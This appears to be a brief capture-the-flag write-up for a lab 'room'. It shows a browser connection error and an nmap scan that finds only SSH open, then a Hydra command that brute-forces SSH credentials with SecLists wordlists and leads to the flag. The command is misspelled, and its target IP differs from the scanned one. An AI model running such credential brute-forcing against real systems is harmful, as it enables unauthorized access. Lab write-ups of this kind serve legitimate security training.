After getting the ip and opening it into the new tab doesn't let us connect to the page instead it gave us that chrome standard error

```error
ERR_CONNECTION_REFUSED

```

So i tried running the nmap scan too what comes out and here is the result 

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-29 15:08 +0530
Nmap scan report for 10.49.190.65
Host is up (0.061s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:91:69:a5:27:b4:b5:75:4c:1c:c4:47:8f:79:e6:70 (RSA)
|   256 0f:29:e7:da:35:25:a5:b1:b7:65:a0:48:15:10:3c:78 (ECDSA)
|_  256 58:d0:14:99:ba:b6:41:73:19:a8:ef:ec:3d:4e:75:d4 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=4/29%OT=22%CT=1%CU=41722%PV=Y%DS=3%DC=T%G=Y%TM=69F1D1A
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=102%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%GCD=3%ISR=109%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=FC%GCD=1%ISR=100%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FC%GCD
OS:=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4E8
OS:NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3%W
OS:3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%CC=
OS:Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z
OS:%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Except what room was saying i said leave the mess why messing when i could do it simply by bruteforcing.

and with the command i was able to get the username and password simply 

```bash
ydra -L /home/Seclists/Usernames/top-usernames-shortlist.txt -P /home/Seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt ssh://10.48.156.200 -t 4
```

And in this way i got the password and the username and i was able to get the flag within the system.
